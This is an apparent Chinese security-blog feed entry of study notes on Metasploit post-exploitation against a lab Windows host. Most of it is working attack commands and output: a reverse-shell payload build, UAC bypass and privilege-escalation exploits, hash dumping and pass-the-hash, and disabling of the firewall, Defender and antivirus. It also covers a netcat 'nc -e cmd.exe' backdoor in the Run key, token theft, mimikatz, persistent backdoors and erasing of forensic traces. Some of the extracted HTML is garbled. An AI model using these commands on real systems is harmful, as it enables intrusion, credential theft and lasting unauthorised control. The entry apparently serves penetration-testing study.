    <content type="html"><![CDATA[<h2 id="msf后渗透常见操作总结"><a href="#msf后渗透常见操作总结" class="headerlink" title="msf后渗透常见操作总结"></a>msf后渗透常见操作总结</h2><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><ul><li><p>已经获得目标系统控制权后扩大战果</p><ul><li>提权</li><li>信息收集</li><li>渗透内网</li><li>永久后门</li></ul></li><li><p>基于已有 session 扩大战果</p><ul><li><pre><code>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o payload.exe<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> kali 监听</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set LHOST 10.0.0.128msf exploit(multi/handler) &gt; exploit -j<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>windows 系统执行 payload.exe</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>kali 进入 metepreter</span><br></pre></td></tr></table></figure>msf exploit(multi/handler) &gt; sessions </code></pre></li></ul></li></ul><h1 id="Active-sessions"><a href="#Active-sessions" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p><hr><p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p><p>msf exploit(multi/handler) &gt; sessions </p><h1 id="Active-sessions-1"><a href="#Active-sessions-1" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p><hr><p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p><p>msf exploit(multi/handler) &gt; sessions -i 1<br>[*] Starting interaction with 1…</p><p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">2.</span>获取<span class="keyword">system</span>账号权限</span><br><span class="line"></span><br><span class="line">- 提权失败，一般是由于 UAC 限制</span><br></pre></td></tr></table></figure><p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John<br>meterpreter &gt; load priv<br>[-] The ‘priv’ extension has already been loaded.<br>meterpreter &gt; getsystem<br>[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:<br>[-] Named Pipe Impersonation (In Memory/Admin)<br>[-] Named Pipe Impersonation (Dropper/Admin)<br>[-] Token Duplication (In Memory/Admin)</p><p>meterpreter &gt; background</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>绕过 UAC 限制</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ask</span><br></pre></td></tr></table></figure><p>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  set FILENAME win_update.exe<br>  set SESSION 1<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">ai4HMWI.png</span>)</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\MXYqrBh.png</span>)</span><br></pre></td></tr></table></figure><br>meterpreter &gt; getsystem<br>meterpreter &gt; getuid</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\uHed9pJ.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/bypassuac<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>show targets<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\eO3yUbv.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac_injection</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/bypassuac_injection<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VwGyhJD.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞直接提权为 system</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ms13<span class="emphasis">_053_</span>schlamperei</span><br></pre></td></tr></table></figure><p>  use exploit/windows/local/ms13_053_schlamperei<br>  set SESSION 1<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![<span class="string">img</span>](<span class="link">https://i.imgur.com/VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_081_</span>track<span class="emphasis">_popup_</span>menu</span><br></pre></td></tr></table></figure><br>use exploit/windows/local/ms13_081_track_popup_menu<br>set SESSION 1<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_097_</span>ie<span class="emphasis">_registry_</span>symlink</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/ms13_097_ie_registry_symlink<br>set SESSION 1<br>set URIPATH /<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>set SRVHOST 10.0.0.128<br>exploit</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ppr_flatten_rec</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/ppr_flatten_rec<br>set SESSION 1<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Jhqu2n4.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>图形化 payload</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set payload windows/vncinject/reverse_tcp</span><br></pre></td></tr></table></figure><pre><code>use exploit/windows/local/ppr_flatten_recset payload windows/vncinject/reverse_tcpset SESSION 1set LHOST 10.0.0.128set ViewOnly falseexploit<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/wOXJo7u.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭 UAC 功能</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>获取 hashdump</span><br></pre></td></tr></table></figure></code></pre><p>  meterpreter &gt; hashdump<br>      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      John:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>尝试利用</span><br></pre></td></tr></table></figure><br>  use exploit/windows/smb/psexec<br>  set RHOST 10.0.0.132<br>  set SMBUser John<br>  set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/vXDrNNx.png</span>)</span><br><span class="line"></span><br><span class="line">报错：Exploit failed [no-access]</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>需要提前关闭 UAC</span><br></pre></td></tr></table></figure><br>sessions -i 2<br>shell<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br>shutdown -r -t 0</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/WJBykgA.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>再次利用</span><br></pre></td></tr></table></figure><p>use exploit/windows/smb/psexec<br>set RHOST 10.0.0.132<br>set SMBUser John<br>set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">4.</span>基础操作 </span><br><span class="line"></span><br><span class="line">##### 关闭 防火墙</span><br><span class="line"></span><br><span class="line">- 需要管理员或<span class="keyword">system</span>权限</span><br></pre></td></tr></table></figure><p>netsh advfirewall set allprofiles state on<br>netsh advfirewall set allprofiles state off</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/VsB8p0A.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">##### 关闭windefend</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>查看服务名称</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/SITzUbY.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭防火墙</span><br></pre></td></tr></table></figure><p>  net stop windefend<br>  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### bitlocker 加密</span><br><span class="line"></span><br><span class="line">- manage-bde -off C:</span><br><span class="line">- manage-bde -status C:</span><br><span class="line"></span><br><span class="line">##### 关闭DEP</span><br><span class="line"></span><br><span class="line">- bcdedit.exe /set &#123;current&#125; nx AlwaysOff</span><br><span class="line"></span><br><span class="line">##### 杀死防病毒软件</span><br><span class="line"></span><br><span class="line">- run killav</span><br><span class="line">- run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line">##### 开启远程桌面服务</span><br></pre></td></tr></table></figure></p><h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>run post/windows/manage/enable_rdp</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Dl02OVL.png</span>)</span><br></pre></td></tr></table></figure><h1 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h1><p>run multi_console_command -rc root/.msf4/loot/20180418001805_default_10.0.0.132_host.windows.cle_842354.txt</p><h1 id="开启服务-1"><a href="#开启服务-1" class="headerlink" title="开启服务"></a>开启服务</h1><p>run getgui –e<br>run getgui -u yuanfh -p pass<br>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 查看远程桌面</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>screenshot</span><br><span class="line"><span class="bullet">- </span>use espia</span><br><span class="line"><span class="bullet">  - </span>screengrab</span><br><span class="line"></span><br><span class="line"><span class="section">##### 使用tokens攻击域控制器</span></span><br><span class="line"></span><br><span class="line">tokens, 用户每次登录，账号绑定临时的tokens,访问资源时提交 tokens 进行身份验证，类似于 web cookies。</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>Incognito</span><br><span class="line"><span class="bullet">  - </span>独立功能的软件，被 msf 集成在 metepreter 中</span><br><span class="line"><span class="bullet">  - </span>无需密码或破解或获取密码 hash，窃取 tokens 将自己伪装成其他用户</span><br><span class="line"><span class="bullet">  - </span>尤其适用于域环境下提权渗透多操作系统</span><br><span class="line"><span class="bullet">- </span>搭建域环境</span><br><span class="line"><span class="bullet">  - </span>DC + XP</span><br><span class="line"><span class="bullet">- </span>load incognito</span><br><span class="line"><span class="bullet">  - </span><span class="code">`list_tokens -u`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`impersonate_token lab\administrator`</span></span><br><span class="line"><span class="bullet">- </span>运行以上命令需要 getsystem</span><br><span class="line"><span class="bullet">  - </span>本地普通权限用户需要先本地权限</span><br><span class="line"><span class="bullet">  - </span><span class="code">`use exploit/windows/local/ms10_015_kitrap0d`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`execute -f cmd.exe -i -t # -t：`</span>使用当前假冒tokens执行程序</span><br><span class="line"><span class="bullet">  - </span>shell</span><br><span class="line"></span><br><span class="line"><span class="section">##### 注册表</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>注册表保存着 windows 几乎全部配置参数</span><br><span class="line"><span class="bullet">  - </span>如果修改不当，可直接造成系统崩溃</span><br><span class="line"><span class="bullet">  - </span>修改前完整备份注册表</span><br><span class="line"><span class="bullet">  - </span>某些注册表的修改是不可逆的</span><br><span class="line"><span class="bullet">- </span>常见用途</span><br><span class="line"><span class="bullet">  - </span>修改、增加启动项</span><br><span class="line"><span class="bullet">  - </span>窃取存储于注册表中的机密信息</span><br><span class="line"><span class="bullet">  - </span>绕过文件型病毒查杀</span><br><span class="line"><span class="bullet">- </span>用注册表添加 nc 后门服务（metepreter）</span><br></pre></td></tr></table></figure><p>meterpreter &gt;</p><p>upload /usr/share/windows-binaries/nc.exe C:\windows\system32</p><p>reg enumkey -k HKLM\software\microsoft\windows\currentversion\run</p><p>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d </p><p>‘C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe’</p><p>reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v nc</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>打开防火墙端口（metepreter）</span><br></pre></td></tr></table></figure><p>meterpreter &gt;<br>execute -f cmd -i -H<br>netsh firewall show opmode<br>netsh firewall add portopening TCP 4444 “test” ENABLE ALL<br>shutdown -r -f -t 0<br>nc 10.0.0.132 444</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 其他注册表项</span><br><span class="line">  - https:<span class="comment">//support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</span></span><br><span class="line"></span><br><span class="line">##### 抓包</span><br><span class="line"></span><br><span class="line">- 抓包（metepreter）</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure><pre><code>load sniffersniffer_interfacessniffer_start 2sniffer_dump 2 1.cap / sniffer_dump 2 1.cap在内存中缓冲区块循环存储抓包（50000包），不写硬盘智能过滤 metepreter 流量，传输全称使用 SSL/TLS 加密<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 解码</span><br><span class="line"></span><br><span class="line">  - use auxiliary/sniffer/psnuffle</span><br><span class="line">  - set PCAPFILE /root/<span class="number">1.</span>cap</span><br><span class="line"></span><br><span class="line">##### 搜索文件</span><br><span class="line"></span><br><span class="line">- search -f *.ini</span><br><span class="line">- search -d c:\documents\ and\ settings\administrator\desktop\ -f *.docx</span><br><span class="line"></span><br><span class="line">##### 破解弱口令</span><br><span class="line"></span><br><span class="line">- John the Ripper 破解弱口令</span><br></pre></td></tr></table></figure></code></pre><ul><li>use post/windows/gather/hashdump # system 权限的 metepreter</li><li>run # 结果保存在 /tmp 目录下</li><li>use auxiliary/analyze/jtr_crack_fast</li><li>run<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 擦除痕迹</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>文件系统访问会留下痕迹。电子取证重点关注</span><br><span class="line"><span class="bullet">- </span>渗透测试和攻击者往往希望销毁文件系统访问痕迹</span><br><span class="line"><span class="bullet">- </span>最好的避免被电子取证发现的方法：不要碰文件系统</span><br><span class="line"><span class="bullet">  - </span>metepreter 的先天优势所在（完全基于内存）</span><br><span class="line"><span class="bullet">- </span>MAC 时间 （Modified / Accessed / Changed）</span><br><span class="line"><span class="bullet">  - </span>ls -l –time=atime/mtime/ctime 1.txt</span><br><span class="line"><span class="bullet">  - </span>stat 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -d “2 days ago” 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -t 1501010101 1.txt</span><br><span class="line"><span class="bullet">- </span>MACE：MFT entry</span><br><span class="line"><span class="bullet">  - </span>MFT：NTFS 文件系统的主文件分配表 Master File Table</span><br><span class="line"><span class="bullet">  - </span>通常 1024 字节或2个硬盘扇区，其中存放多项 entry 信息</span><br><span class="line"><span class="bullet">  - </span>包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期）</span><br><span class="line"><span class="bullet">  - </span>更多信息可研究文件系统取证分析技术</span><br><span class="line"></span><br><span class="line"><span class="section">##### pivoting 跳板 /枢纽/支点</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>msfvenom 制作 payload</span><br></pre></td></tr></table></figure>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=kali_firewall LPORT=4444 -b “\x00\xff” -e x86/shikata_ga_nai -f exe -o payload.exe<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>获取 system 权限</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/PXgwA0S.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用已经控制的一台计算机作为入侵内网的跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>在其他内网计算机看来访问全部来自于跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>run autoroute -s 1.1.1.0/24 # 不能访问外网的被攻击目标内网网段</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>自动路由现实场景</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>  利用 win7 攻击内网 XP（对比 xp 有无外网访问权的情况）<br>  – 扫描内网：use auxiliary/scanner/portscan/tcp  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> Pivoting 之端口转发 portfwd</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>  利用已经被控计算机，在kali 与攻击目标之间实现端口转发<br>  portfwd add -L LIP -l LPORT -r RIP -p RPORT<br>  portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389<br>  portfwd list / delete / flush  <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>set RHOST 127.0.0.1<br>set LHOST 2.1.1.10<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set exitonsession false</span><br><span class="line"></span><br><span class="line"><span class="section">#### 持久后门</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞取得的 metepreter 运行内存中，重启失效</span><br><span class="line"><span class="bullet">- </span>重复 exploit 漏洞可能造成服务崩溃</span><br><span class="line"><span class="bullet">- </span>持久后门保证漏洞修复后仍可远程控制</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>metepreter 后门</span><br></pre></td></tr></table></figure>run metsvc -A # 删除 -r<br>use exploit/multi/handler<br>set PAYLOAD windows/metsvc_bind_tcp<br>set LPORT 31337<br>set RHOST 1.1.1.1<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>持久后门</span><br></pre></td></tr></table></figure>run persistence -h<br>run persistence -X -i 10 -p 4444 -r 10.0.0.128<br>run persistence -U -i 20 -p 4444 -r 10.0.0.128<br>run persistence -S -i 20 -p 4444 -r 10.0.0.128<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### mimikatz</span><br><span class="line"></span><br><span class="line">- hashdump 使用的就是 mimikatz 的部分功能</span><br></pre></td></tr></table></figure>getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��tspkg ��livessp<br>mimikatz_command -h<br>mimikatz_command -f a::<br>mimikatz_command -f samdump::hashes<br>mimikatz_command -f handle::list<br>mimikatz_command -f service::list<br>mimikatz_command -f crypto::listProviders<br>mimikatz_command -f winmine::infos # 扫雷游戏<pre><code></code></pre></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;msf后渗透常见操作总结&quot;&gt;&lt;a href=&quot;#msf后渗透常见操作总结&quot; class=&quot;headerlink&quot; title=&quot;msf后渗透常见操作总结&quot;&gt;&lt;/a&gt;msf后渗透常见操作总结&lt;/h2&gt;&lt;h4 id=&quot;1-准备工作&quot;&gt;&lt;a href=&quot;#1-准备工作&quot;
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="msf后渗透" scheme="https://shu1l.github.io/tags/msf%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>windows中常见提权方式总结(三)</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/</id>
    <published>2020-04-28T01:56:53.000Z</published>
    <updated>2020-06-05T10:16:23.379Z</updated>
    
